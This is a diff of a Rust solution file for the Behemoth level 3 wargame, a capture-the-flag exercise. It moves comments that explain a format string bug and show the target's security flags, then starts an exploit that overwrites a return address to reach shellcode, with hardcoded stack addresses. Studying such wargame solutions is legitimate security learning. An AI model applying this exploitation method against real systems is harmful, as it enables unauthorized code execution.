@@ -1,28 +1,28 @@
 use anyhow::Result;
 use crate::util::*;
 
+/// behemoth3 is a fairly simple format string exploit, calling gets on a 200 len buffer and then printing the result:
+/// main() {
+///     char local_cc [200];
+///     printf("Identify yourself: ");
+///     fgets(local_cc,200,stdin);
+///     printf("Welcome, ");
+///     printf(local_cc);
+///     puts("\naaaand goodbye again.");
+///     return 0;
+/// }
+/// [*] '/behemoth/behemoth3'
+/// Arch:     i386-32-little
+/// RELRO:    No RELRO
+/// Stack:    No canary found
+/// NX:       NX unknown - GNU_STACK missing
+/// PIE:      No PIE (0x8048000)
+/// Stack:    Executable
+/// RWX:      Has RWX segments
+///
+/// just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
+/// idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
 pub fn solve(password: &str) -> Result<String> {
-    // behemoth3 is a fairly simple format string exploit, calling gets on a 200 len buffer and then printing the result:
-    // main() {
-    //     char local_cc [200];
-    //     printf("Identify yourself: ");
-    //     fgets(local_cc,200,stdin);
-    //     printf("Welcome, ");
-    //     printf(local_cc);
-    //     puts("\naaaand goodbye again.");
-    //     return 0;
-    // }
-    // [*] '/behemoth/behemoth3'
-    // Arch:     i386-32-little
-    // RELRO:    No RELRO
-    // Stack:    No canary found
-    // NX:       NX unknown - GNU_STACK missing
-    // PIE:      No PIE (0x8048000)
-    // Stack:    Executable
-    // RWX:      Has RWX segments
-    //
-    // just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
-    // idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
 
     let ret_addr1 = hex::decode("3cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp. had to tweak by 16 byte diffs to find the correct value remote
     let ret_addr2 = hex::decode("3ed5ffff")?; // two bytes up to write the higher bytes of the address
